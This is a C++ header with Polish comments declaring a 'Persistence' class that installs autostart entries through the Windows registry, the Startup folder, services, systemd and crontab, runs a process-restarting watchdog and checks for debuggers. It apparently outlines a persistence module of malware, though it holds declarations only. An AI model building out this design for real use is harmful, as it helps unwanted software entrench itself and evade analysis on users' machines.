#pragma once

#include <string>
#include <vector>
#include <functional>
#include <chrono>
#include <thread>
#include <atomic>
#include <memory>

namespace deadcrow {
namespace core {

class Persistence {
public:
    // Konstruktor
    Persistence();
    
    // Destruktor
    ~Persistence();
    
    // Instalacja autostartu
    bool installAutostart(const std::string& executable_path, const std::string& startup_name);
    
    // Usunięcie autostartu
    bool removeAutostart(const std::string& startup_name);
    
    // Uruchomienie watchdoga
    bool startWatchdog(const std::string& process_name, int check_interval_seconds = 60);
    
    // Zatrzymanie watchdoga
    void stopWatchdog();
    
    // Sprawdzenie, czy watchdog jest aktywny
    bool isWatchdogActive() const;
    
    // Ustawienie callbacka do raportowania statusu
    void setStatusCallback(std::function<void(const std::string&)> callback);
    
private:
    // Wątek watchdoga
    std::unique_ptr<std::thread> watchdog_thread_;
    
    // Flaga aktywności watchdoga
    std::atomic<bool> watchdog_active_;
    
    // Callback do raportowania statusu
    std::function<void(const std::string&)> status_callback_;
    
    // Funkcja wykonywana w wątku watchdoga
    void watchdogLoop(const std::string& process_name, int check_interval_seconds);
    
    // Sprawdzanie, czy proces jest uruchomiony
    bool isProcessRunning(const std::string& process_name);
    
    // Uruchomienie procesu
    bool startProcess(const std::string& process_path);
    
    // Raportowanie statusu
    void reportStatus(const std::string& status);
    
    // Sprawdzanie, czy nie jesteśmy debugowani
    bool checkForDebugging();
    
    // Metody specyficzne dla platformy
#ifdef _WIN32
    // Instalacja autostartu w rejestrze Windows
    bool installWindowsRegistry(const std::string& executable_path, const std::string& startup_name);
    
    // Instalacja autostartu w folderze Startup
    bool installWindowsStartupFolder(const std::string& executable_path, const std::string& startup_name);
    
    // Instalacja jako usługa Windows
    bool installWindowsService(const std::string& executable_path, const std::string& service_name);
#else
    // Instalacja autostartu w systemie Linux
    bool installLinuxAutostart(const std::string& executable_path, const std::string& startup_name);
    
    // Instalacja jako usługa systemd
    bool installSystemdService(const std::string& executable_path, const std::string& service_name);
    
    // Instalacja w crontab
    bool installCrontab(const std::string& executable_path);
#endif
};

} // namespace core
} // namespace deadcrow
